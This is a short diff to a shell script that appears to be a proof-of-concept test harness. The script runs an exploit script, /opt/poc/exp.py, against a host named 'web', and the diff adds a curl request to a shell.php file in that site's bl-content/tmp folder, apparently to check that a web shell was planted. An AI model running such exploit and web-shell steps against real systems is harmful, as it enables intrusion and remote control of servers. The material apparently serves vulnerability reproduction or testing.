@@ -6,4 +6,5 @@ echo "start"
 firefox --version
 sleep 10
 python3 /opt/poc/exp.py http://web 
+curl http://web/bl-content/tmp/shell.php
 echo "poc ok"
